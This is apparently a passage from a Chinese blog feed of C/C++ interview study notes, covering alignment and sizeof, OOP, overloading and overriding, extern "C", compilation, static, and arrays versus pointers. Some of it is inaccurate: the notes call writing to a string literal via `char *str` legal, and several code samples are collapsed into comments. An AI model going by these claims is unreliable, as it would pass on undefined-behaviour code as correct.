class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">example</span> &#123;</span>    <span class="keyword">int</span> a[<span class="number">5</span>];    <span class="keyword">char</span> b;    <span class="keyword">double</span> c;   &#125;; </span><br><span class="line"><span class="keyword">int</span> result = <span class="built_in"><span class="keyword">sizeof</span></span>(example);   <span class="comment">/* 如果以最长20字节为准，内部double占8字节，这段内存的地址0x00000020并不是double的整数倍，只有当最小为0x00000024时可以满足整除double（8Byte）同时又可以容纳int a[5]的大小，所以正确的结果应该是result=24 */</span>  </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">example</span> &#123;</span>    <span class="keyword">int</span> a[<span class="number">5</span>];    <span class="keyword">char</span> b;    <span class="keyword">double</span> c;   &#125;test_struct; <span class="keyword">int</span> result = <span class="built_in"><span class="keyword">sizeof</span></span>(test_struct);   <span class="comment">/* 如果我们不考虑字节对齐，那么内存地址0x0021不是double（8Byte）的整数倍，所以需要字节对齐，那么此时满足是double（8Byte）的整数倍的最小整数是0x0024，说明此时char b对齐int扩充了三个字节。所以最后的结果是result=32 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">example</span> &#123;</span>    <span class="keyword">char</span> b;    <span class="keyword">double</span> c;    <span class="keyword">int</span> a;   &#125;test_struct;   <span class="keyword">int</span> result = <span class="built_in"><span class="keyword">sizeof</span></span>(test_struct);   <span class="comment">/* 字节对齐除了内存起始地址要是数据类型的整数倍以外，还要满足一个条件，那就是占用的内存空间大小需要是结构体中占用最大内存空间的类型的整数倍，所以20不是double（8Byte）的整数倍，我们还要扩充四个字节，最后的结果是result=24 */</span></span><br></pre></td></tr></table></figure><h1 id="面向对象（一）"><a href="#面向对象（一）" class="headerlink" title="面向对象（一）"></a>面向对象（一）</h1><h2 id="简述一下面向对象的三大特征"><a href="#简述一下面向对象的三大特征" class="headerlink" title="简述一下面向对象的三大特征"></a>简述一下面向对象的三大特征</h2><blockquote><p>面向对象的三大特征是封装、继承、多态。</p></blockquote><ol><li><p>封装</p><p> 将数据和操作数据的方法进行有机结合，隐藏对象的属性和实现细节，仅对外公开接口来和对象进行 交互。封装本质上是一种管理：我们如何管理兵马俑呢？比如如果什么都不管，兵马俑就被随意破坏了。那么我们首先建了一座房子把兵马俑给封装起来。但是我们目的全封装起来，不让别人看。所以我们开放了售票通 道，可以买票突破封装在合理的监管机制下进去参观。类也是一样，不想给别人看到的，我们使用protected/private把成员封装起来。开放一些共有的成员函数对成员合理的访问。所以封装本质是一种管理。 </p></li><li><p><font color="#FF8C00">继承</font></p><p> 可以使用现有类的所有功能，并在无需重新编写原来的类的情况下对这些功能进行扩展。</p></li></ol><table><thead><tr><th>继承方式</th><th>private继承</th><th>protected继承</th><th>public继承</th></tr></thead><tbody><tr><td>基类的private成员</td><td>不可见</td><td>不可见</td><td>不可见</td></tr><tr><td>基类的protected成员</td><td>变为private成员</td><td>仍为protected成员</td><td>仍为protected成员</td></tr><tr><td>基类的public成员</td><td>变为private成员</td><td>变为protected成员</td><td>仍为public成员仍为public成员</td></tr><tr><td>3. 多态</td><td></td><td></td><td></td></tr></tbody></table><pre><code>&lt;font color=&quot;#FF00FF&quot;&gt;用父类型别的指针指向其子类的实例，然后通过父类的指针调用实际子类的成员函数。&lt;/font&gt;实现多态，有二种方式，重写，重载。</code></pre><h2 id="简述一下-C-的重载和重写，以及它们的区别"><a href="#简述一下-C-的重载和重写，以及它们的区别" class="headerlink" title="简述一下 C++ 的重载和重写，以及它们的区别"></a>简述一下 C++ 的重载和重写，以及它们的区别</h2><h3 id="重写"><a href="#重写" class="headerlink" title="重写"></a>重写</h3><pre><code>是指派生类中存在重新定义的函数。其函数名，参数列表，返回值类型，所有都必须同基类中被重写的函数一致。只有函数体不同（花括号内），派生类对象调用时会调用派生类的重写函数，不会调用被重写函数。重写的基类中被重写的函数必须有virtual修饰。</code></pre><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span>  </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span> </span><br><span class="line"><span class="keyword">public</span>:  <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">fun</span><span class="params">()</span>  </span>&#123;  </span><br><span class="line">cout &lt;&lt; <span class="string">&quot;A&quot;</span>;  </span><br><span class="line">&#125; </span><br><span class="line">&#125;; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> :</span><span class="keyword">public</span> A &#123; </span><br><span class="line"><span class="keyword">public</span>:  <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">fun</span><span class="params">()</span>  </span>&#123;  </span><br><span class="line">cout &lt;&lt; <span class="string">&quot;B&quot;</span>;</span><br><span class="line">&#125; </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">A* a = <span class="keyword">new</span> <span class="built_in">B</span>();</span><br><span class="line">a-&gt;<span class="built_in">fun</span>();<span class="comment">//输出B，A类中的fun在B类中重写</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h3><pre><code>我们在平时写代码中会用到几个函数但是他们的实现功能相同，但是有些细节却不同。例如：交换两个数的值其中包括（int, float,char,double)这些个类型。在C语言中我们是利用不同的函数名来加以区分。这样的代码不美观而且给程序猿也带来了很多的不便。于是在C++中人们提出了用一个函数名定义多个函数，也就是所谓的函数重载。函数重载是指同一可访问区内被声明的几个具有不同参数列（参数的类型，个数，顺序不同）的同名函数，根据参数列表确定调用哪个函数，重载不关心函数返回类型。</code></pre><h2 id="说说-C-的重载和重写是如何实现的"><a href="#说说-C-的重载和重写是如何实现的" class="headerlink" title="说说 C++ 的重载和重写是如何实现的"></a>说说 C++ 的重载和重写是如何实现的</h2><h3 id="重载-1"><a href="#重载-1" class="headerlink" title="重载"></a>重载</h3><blockquote><p>C++利用命名倾轧（name mangling）技术，来改名函数名，区分参数不同的同名函数。命名倾轧是在<font color="#FF00FF">编译阶段</font>完成的。 </p></blockquote><p><strong>C++定义同名重载函数</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">double</span> b)</span> </span>&#123; </span><br><span class="line"><span class="keyword">return</span> ((a)+(b)); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">double</span> a,<span class="keyword">float</span> b)</span> </span>&#123;  </span><br><span class="line"><span class="keyword">return</span> ((a)+(b)); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">float</span> a,<span class="keyword">int</span> b)</span> </span>&#123;  </span><br><span class="line"><span class="keyword">return</span> ((a)+(b)); &#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;  <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br></pre></td></tr></table></figure><p><img src="https://files.shanqianche.cn/202211/1668527548093.png" alt="由上图可得，d代表double，f代表float，i代表int，加上参数首字母以区分同名函数"></p><h3 id="重写-1"><a href="#重写-1" class="headerlink" title="重写"></a>重写</h3><blockquote><p>在基类的函数前加上virtual关键字，在派生类中重写该函数，<font color="#FF8C00">运行时将会根据对象的实际类型来调用相应的函数。如果对象类型是派生类，就调用派生类的函数；如果对象类型是基类，就调用基类的函数。</font></p></blockquote><ol><li>用virtual关键字申明的函数叫做虚函数，虚函数肯定是类的成员函数。 </li><li>存在虚函数的类都有一个一维的虚函数表叫做虚表，类的对象有一个指向虚表开始的虚指针。虚表是和类对应的，虚表指针是和对象对应的。</li><li>多态性是一个接口多种实现，是面向对象的核心，分为类的多态性和函数的多态性。 </li><li>重写用虚函数来实现，结合动态绑定。</li><li>纯虚函数是虚函数再加上 = 0。</li><li>抽象类是指包括至少一个纯虚函数的类。</li><li>纯虚函数：virtual void fun()=0。即抽象类必须在子类实现这个函数，即先有名称，没有内容，在派生类实现内容。</li></ol><h2 id="说说-C-语言如何实现-C-语言中的重载"><a href="#说说-C-语言如何实现-C-语言中的重载" class="headerlink" title="说说 C 语言如何实现 C++ 语言中的重载"></a>说说 C 语言如何实现 C++ 语言中的重载</h2><blockquote><p><font color="#FF00FF">c语言中不允许有同名函数，因为编译时函数命名是一样的</font>，不像c++会添加参数类型和返回类型作为函数编译后的名称，进而实现重载。如果要用c语言显现函数重载，可通过以下方式来实现：</p></blockquote><ol><li>使用函数指针来实现，重载的函数不能使用同名称，只是类似的实现了函数重载功能</li><li>重载函数使用可变参数，方式如打开文件open函数</li><li>gcc有内置函数，程序使用编译函数可以实现函数重载.</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span>   </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span>   </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func_int</span><span class="params">(<span class="keyword">void</span> * a)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%dn&quot;</span>,*(<span class="keyword">int</span>*)a);  <span class="comment">//输出int类型，注意 void * 转化为int </span></span><br><span class="line">&#125;   </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func_double</span><span class="params">(<span class="keyword">void</span> * b)</span> </span>&#123;    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.2fn&quot;</span>,*(<span class="keyword">double</span>*)b);</span><br><span class="line">&#125;   </span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*ptr)</span><span class="params">(<span class="keyword">void</span> *)</span></span>;  <span class="comment">//typedef申明一个函数指针   </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">c_func</span><span class="params">(ptr p,<span class="keyword">void</span> *param)</span> </span>&#123;     </span><br><span class="line">      p(param);                <span class="comment">//调用对应函数 </span></span><br><span class="line">&#125;   </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;    </span><br><span class="line">      <span class="keyword">int</span> a = <span class="number">23</span>;     </span><br><span class="line">      <span class="keyword">double</span> b = <span class="number">23.23</span>;    </span><br><span class="line">      c_func(func_int,&amp;a);   </span><br><span class="line">      c_func(func_double,&amp;b);    </span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="说说构造函数有几种，分别什么作用"><a href="#说说构造函数有几种，分别什么作用" class="headerlink" title="说说构造函数有几种，分别什么作用"></a>说说构造函数有几种，分别什么作用</h2><p><strong>strong text</strong></p>]]></content>
      
      
      <categories>
          
          <category> graduate student time </category>
          
      </categories>
      
      
        <tags>
            
            <tag> study, graduate student,C/C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C/C++基础（一）</title>
      <link href="/2022/11/14/C%E5%92%8CC++%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/2022/11/14/C%E5%92%8CC++%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="语言基础"><a href="#语言基础" class="headerlink" title="语言基础"></a>语言基础</h1><h2 id="C语言和C-的区别"><a href="#C语言和C-的区别" class="headerlink" title="C语言和C++的区别"></a>C语言和C++的区别</h2><ol><li>C语言是C++的子集，C++可以很好兼容C语言。但是C++又有很多新特性，如引用、智能指针、auto变量等。</li><li>C++是面对对象的编程语言；C语言是面对过程的编程语言。</li><li>C语言有一些不安全的语言特性，如指<font color="#FF00FF">针使用的潜在危险、强制转换的不确定性、内存泄露</font>等。而C++对此增加了不少新特性来改善安全性，如const常量、引用、cast转换、智能指针、try—catch等等；</li><li>C++可复用性高，C++引入了模板的概念，后面在此基础上，实现了方便开发的标准模板库STL。C++的STL库相对于C语言的函数库更灵活、更通用。</li></ol><h2 id="C-中-struct-和-class-的区别"><a href="#C-中-struct-和-class-的区别" class="headerlink" title="C++中 struct 和 class 的区别"></a>C++中 struct 和 class 的区别</h2><ol><li>struct 一般用于描述一个数据结构集合，而 class 是对一个对象数据的封装</li><li>struct 中默认的访问控制权限是 <font color="#FF00FF">public </font>的，而 class 中默认的访问控制权限是<font color="#FF00FF"> private</font> 的，例如：</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">A</span>&#123;</span>  <span class="keyword">int</span> iNum; <span class="comment">// 默认访问控制权限是 public &#125; class B&#123;  int iNum; // 默认访问控制权限是 private &#125;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>在继承关系中，<font color="#FF8C00">struct 默认是公有继承，而 class 是私有继承</font>；</li><li>class 关键字可以用于定义模板参数，就像 typename，而 struct 不能用于定义模板参数，例如：</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span> Y&gt; <span class="comment">// 可以把typename 换成 class  int Func(const T&amp; t, const Y&amp; y) &#123;      //TODO  &#125;</span></span><br></pre></td></tr></table></figure><ol start="5"><li><font color="#FF8C00">C++ 中的 struct 是对 C 中的 struct 进行了扩充，它们在声明时的区别如下</font>：</li></ol><table><thead><tr><th></th><th>C</th><th>C++</th></tr></thead><tbody><tr><td>成员函数</td><td>不能有</td><td>可以</td></tr><tr><td>静态成员</td><td>不能有</td><td>可以</td></tr><tr><td>访问控制</td><td>默认public，不能修改</td><td>public/private/protected</td></tr><tr><td>继承关系</td><td>不可以继承</td><td>可从类或者其他结构体继承</td></tr><tr><td>初始化</td><td>不能直接初始化数据成员</td><td>可以</td></tr><tr><td>6. 使用时的区别：C 中使用结构体需要加上 struct 关键字，或者对结构体使用 typedef 取别名，而 C++ 中可以省略 struct 关键字直接使用，例如：</td><td></td><td></td></tr></tbody></table><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span>&#123;</span>  <span class="keyword">int</span>  iAgeNum;  string strName; &#125; </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Student</span> <span class="title">Student2</span>;</span> <span class="comment">//C中取别名  struct Student stu1; // C 中正常使用 Student2 stu2;   // C 中通过取别名的使用 Student stu3;   // C++ 中使用</span></span><br></pre></td></tr></table></figure><h2 id="说说include头文件的顺序以及双引号””和尖括号-lt-gt-的区别"><a href="#说说include头文件的顺序以及双引号””和尖括号-lt-gt-的区别" class="headerlink" title="说说include头文件的顺序以及双引号””和尖括号&lt;&gt;的区别"></a>说说include头文件的顺序以及双引号””和尖括号&lt;&gt;的区别</h2><h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><ol><li>尖括号&lt;&gt;的头文件是系统文件，双引号””的头文件是自定义文件。</li><li>编译器预处理阶段查找头文件的路径不一样。</li></ol><h3 id="查找路径"><a href="#查找路径" class="headerlink" title="查找路径"></a>查找路径</h3><ol><li>使用尖括号&lt;&gt;的头文件的查找路径：编译器设置的头文件路径–&gt;系统变量。</li><li>使用双引号””的头文件的查找路径：<font color="#FF8C00">当前头文件目录</font>–&gt;编译器设置的头文件路径–&gt;系统变量。</li></ol><h2 id="说说C-结构体和C结构体的区别"><a href="#说说C-结构体和C结构体的区别" class="headerlink" title="说说C++结构体和C结构体的区别"></a>说说C++结构体和C结构体的区别</h2><ol><li>C的结构体内不允许有函数存在，C++允许有内部成员函数，且允许该函数是虚函数。</li><li>C的结构体对内部成员变量的访问权限只能是public，而C++允许public,protected,private三种。</li><li>C语言的结构体是不可以继承的，C++的结构体是可以从其他的结构体或者类继承过来的。</li><li>C 中使用结构体需要加上 struct 关键字，或者对结构体使用 typedef 取别名，而 C++ 中可以省略 struct 关键字直接使用。</li></ol><h2 id="导入C函数的关键字是什么，C-编译时和C有什么不同？"><a href="#导入C函数的关键字是什么，C-编译时和C有什么不同？" class="headerlink" title="导入C函数的关键字是什么，C++编译时和C有什么不同？"></a>导入C函数的关键字是什么，C++编译时和C有什么不同？</h2><ol><li>关键字：在C++中，导入C函数的关键字是extern，表达形式为extern “C”， extern “C”的主要作用就是为了能够正确实现C++代码调用其他C语言代码。<font color="#FF8C00">加上extern “C”后，会指示编译器这部分代码按C语言的进行编译</font>，而不是C++的。</li><li>编译区别：<font color="#FF8C00">由于C++支持函数重载，因此编译器编译函数的过程中会将函数的参数类型也加到编译后的代码中，而不仅仅是函数名</font>；而C语言并不支持函数重载，因此编译C语言代码的函数时不会带上函数的参数类型，<font color="#FF8C00">一般只包括函数名。</font></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//extern示例 //在C++程序里边声明该函数，会指示编译器这部分代码按C语言的进行编译 extern &quot;C&quot; int strcmp(const char *s1, const char *s2);  </span></span><br><span class="line"><span class="comment">//在C++程序里边声明该函数 extern &quot;C&quot;&#123;     #include &lt;string.h&gt;//string.h里边包含了要调用的C函数的声明 &#125;  //两种不同的语言，有着不同的编译规则，比如一个函数fun，可能C语言编译的时候为_fun，而C++则是__fun__</span></span><br></pre></td></tr></table></figure><h2 id="简述C-从代码到可执行二进制文件的过程"><a href="#简述C-从代码到可执行二进制文件的过程" class="headerlink" title="简述C++从代码到可执行二进制文件的过程"></a>简述C++从代码到可执行二进制文件的过程</h2><blockquote><p>C++和C语言类似，一个C++程序从源码到执行文件，有四个过程，预编译、编译、汇编、链接。</p></blockquote><h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><p>（1） 将所有的#define删除，并且展开所有的宏定义<br>（2） 处理所有的条件预编译指令，如#if、#ifndef<br>（3） 处理#include预编译指令，将被包含的文件插入到该预编译指令的位置。<br>（4） 过滤所有的注释<br>（5） 添加行号和文件名标识。</p><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>（1） 词法分析：将源代码的字符序列分割成一系列的记号。<br>（2） 语法分析：对记号进行语法分析，产生语法树。<br>（3） 语义分析：判断表达式是否有意义。<br>（4） 代码优化：<br>（5） 目标代码生成：生成汇编代码。<br>（6） 目标代码优化：</p><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><p>这个过程主要是将汇编代码转变成机器可以执行的指令。</p><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p>将不同的源文件产生的目标文件进行链接，从而形成一个可以执行的程序。</p><h4 id="链接分为静态链接和动态链接。"><a href="#链接分为静态链接和动态链接。" class="headerlink" title="链接分为静态链接和动态链接。"></a>链接分为静态链接和动态链接。</h4><ol><li><p>静态链接，是在链接的时候就已经把要调用的函数或者过程<font color="#FF00FF">链接到了生成的可执行文件中，就算你在去把静态库删除也不会影响可执行程序的执行</font>；生成的静态链接库，Windows下以.lib为后缀，Linux下以.a为后缀。</p></li><li><p>动态链接，是在链接的时候没有把调用的函数代码链接进去，<font color="#FF00FF">而是在执行的过程中，再去找要链接的函数，生成的可执行文件中没有函数代码，只包含函数的重定位信息，所以当你删除动态库时，可执行程序就不能运行</font>。生成的动态链接库，Windows下以.dll为后缀，Linux下以.so为后缀。</p></li></ol><h2 id="static关键字的作用"><a href="#static关键字的作用" class="headerlink" title="static关键字的作用"></a>static关键字的作用</h2><ol><li>定义全局静态变量和局部静态变量：在变量前面加上static关键字。<font color="#FF8C00">初始化的静态变量会在数据段分配内存</font>，<font color="#FF8C00">未初始化的静态变量会在BSS段分配内存</font>。直到程序结束，静态变量始终会维持当前值。只不过全局静态变量和局部静态变量的作用域不一样</li><li>定义静态函数：在函数返回类型前加上static关键字，函数即被定义为静态函数。<font color="#FF8C00">静态函数只能在本源文件中使用</font>；</li><li>在变量类型前加上static关键字，变量即被定义为静态变量。<font color="#FF8C00">静态变量只能在本源文件中使用；</font></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//示例 static int a; static void func();</span></span><br></pre></td></tr></table></figure><ol start="4"><li>在c++中，static关键字可以用于定义类中的静态成员变量：<font color="#FF8C00">使用静态数据成员</font>，它既可以被当成全局变量那样去存储，但又被隐藏在类的内部。<font color="#FF8C00">类中的static静态数据成员拥有一块单独的存储区，而不管创建了多少个该类的对象。所有这些对象的静态数据成员都共享这一块静态存储空间。</font></li><li>在c++中，<font color="#FF8C00">static关键字可以用于定义类中的静态成员函数</font>：与静态成员变量类似，类里面同样可以定义静态成员函数。只需要在<font color="#FF8C00">函数前加上关键字static即可</font>。如静态成员函数也是类的一部分，而不是对象的一部分。所有这些对象的静态数据成员都共享这一块静态存储空间。</li><li><font color="#FF00FF">当调用一个对象的非静态成员函数时，系统会把该对象的起始地址赋给成员函数的this指针。而静态成员函数不属于任何一个对象，因此C++规定静态成员函数没有this指针（划重点，面试题常考）。既然它没有指向某一对象，也就无法对一个对象中的非静态成员进行访问。</font></li></ol><h2 id="说说数组和指针的区别"><a href="#说说数组和指针的区别" class="headerlink" title="说说数组和指针的区别"></a>说说数组和指针的区别</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><ol><li>数组：数组是用于储存多个相同类型数据的集合。 数组名是首元素的地址。 </li><li>指针：指针相当于一个变量，但是它和不同变量不一样，它存放的是其它变量在内存中的地址。 指针名指向了内存的首地址。 </li></ol><h3 id="区别-1"><a href="#区别-1" class="headerlink" title="区别"></a>区别</h3><h4 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h4><p>同类型指针变量可以相互赋值；数组不行，只能一个一个元素的赋值或拷贝</p><h4 id="存储方式"><a href="#存储方式" class="headerlink" title="存储方式"></a>存储方式</h4><p>数组：数组在内存中是连续存放的，开辟一块连续的内存空间。数组是根据数组的下进行访问的，<font color="#FF8C00">数组的存储空间，不是在静态区就是在栈上</font>。<br>指针：指针很灵活，它可以指向任意类型的数据。<font color="#FF8C00">指针的类型说明了它所指向地址空间的内存</font>。由于指针本身就是一个变<font color="#FF00FF">指针的存储空间不能确定。<br></font>量，再加上它所存放的也是变量，所以指针的存储空间不能确定。</p><h4 id="求sizeof"><a href="#求sizeof" class="headerlink" title="求sizeof"></a>求sizeof</h4><ol><li>数组所占存储空间的内存大小：sizeof（数组名）/sizeof（数据类型）</li><li>在32位平台下，无论指针的类型是什么，sizeof（指针名）都是4，在64位平台下，无论指针的类型是什么，sizeof（指针名）都是8。</li></ol><h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 数组 int a[5] = &#123; 0 &#125;; char b[] = &quot;Hello&quot;; </span></span><br><span class="line"><span class="comment">// 按字符串初始化，大小为6 char c[] = &#123; &#x27;H&#x27;,&#x27;e&#x27;,&#x27;l&#x27;,&#x27;l&#x27;,&#x27;o&#x27;,&#x27;\0&#x27; &#125;; </span></span><br><span class="line"><span class="comment">// 按字符初始化 int* arr = new int[10]; // 动态创建一维数组  // 指针 </span></span><br><span class="line"><span class="comment">// 指向对象的指针 int* p = new int(0); delete p; </span></span><br><span class="line"><span class="comment">// 指向数组的指针 int* p1 = new int[10]; delete[] p1; </span></span><br><span class="line"><span class="comment">// 指向类的指针： string* p2 = new string; delete p2; </span></span><br><span class="line"><span class="comment">// 指向指针的指针（二级指针） int** pp = &amp;p; **pp = 10;</span></span><br></pre></td></tr></table></figure><h4 id="指针操作"><a href="#指针操作" class="headerlink" title="指针操作"></a>指针操作</h4><ol><li><font color="#FF8C00">数组名的指针操作</font></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a[<span class="number">3</span>][<span class="number">4</span>];   </span><br><span class="line"><span class="built_in"><span class="keyword">int</span></span> (*p)[<span class="number">4</span>];  <span class="comment">//该语句是定义一个数组指针，指向含4个元素的一维数组 p = a;    </span></span><br><span class="line"><span class="comment">//将该二维数组的首地址赋给p，也就是a[0]或&amp;a[0][0] p++;          </span></span><br><span class="line"><span class="comment">//该语句执行过后，也就是p=p+1；p跨过行a[0][]指向了行a[1][]               </span></span><br><span class="line"><span class="comment">//所以数组指针也称指向一维数组的指针，亦称行指针。 </span></span><br><span class="line"><span class="comment">//访问数组中第i行j列的一个元素，有几种操作方式： </span></span><br><span class="line"><span class="comment">//*(p[i]+j)、*(*(p+i)+j)、(*(p+i))[j]、p[i][j]。其中，优先级：()&gt;[]&gt;*。 //这几种操作方式都是合法的。</span></span><br></pre></td></tr></table></figure><ol start="2"><li>指针变量的数据操作</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *str = <span class="string">&quot;hello,douya!&quot;</span>;</span><br><span class="line">str[<span class="number">2</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">*(str+<span class="number">2</span>) = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="comment">//这两种操作方式都是合法的。</span></span><br></pre></td></tr></table></figure><h2 id="说说什么是函数指针，如何定义函数指针，有什么使用场景"><a href="#说说什么是函数指针，如何定义函数指针，有什么使用场景" class="headerlink" title="说说什么是函数指针，如何定义函数指针，有什么使用场景"></a>说说什么是函数指针，如何定义函数指针，有什么使用场景</h2><ol><li>概念：函数指针就是指向函数的指针变量。每一个函数都有一个入口地址，该入口地址就是函数指针所指向的地址。</li><li>定义形式如下</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> a)</span></span>;  </span><br><span class="line"><span class="built_in"><span class="keyword">int</span></span> (*f)(<span class="keyword">int</span> a);  </span><br><span class="line">f = &amp;func;  </span><br></pre></td></tr></table></figure><ol start="3"><li>函数指针的应用场景：回调（callback）。我们调用别人提供的 API函数(Application Programming Interface,应用程序编程接口)，称为Call；然后如果别人的库里面调用我们的函数，就叫Callback。</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//以库函数qsort排序函数为例，它的原型如下：</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">qsort</span><span class="params">(<span class="keyword">void</span> *base,<span class="comment">//void*类型，代表原始数组</span></span></span></span><br><span class="line"><span class="params"><span class="function">           <span class="keyword">size_t</span> nmemb, <span class="comment">//第二个是size_t类型，代表数据数量</span></span></span></span><br><span class="line"><span class="params"><span class="function">           <span class="keyword">size_t</span> size, <span 